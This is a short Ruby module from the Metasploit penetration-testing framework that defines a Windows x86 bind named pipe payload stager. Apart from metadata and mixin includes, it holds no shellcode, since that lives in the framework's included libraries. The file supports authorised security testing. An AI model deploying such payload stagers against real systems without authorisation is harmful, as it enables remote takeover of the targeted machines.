##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

module MetasploitModule

  CachedSize = 349

  include Msf::Payload::Stager
  include Msf::Payload::Windows::BindNamedPipe

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Windows x86 Bind Named Pipe Stager',
      'Description'   => 'Listen for a pipe connection (Windows x86)',
      'Author'        => [ 'UserExistsError' ],
      'License'       => MSF_LICENSE,
      'Platform'      => 'win',
      'Arch'          => ARCH_X86,
      'Handler'       => Msf::Handler::BindNamedPipe,
      'Convention'    => 'sockedi', # hPipe
      'Stager'        => { 'RequiresMidstager' => false }
      ))
  end
end
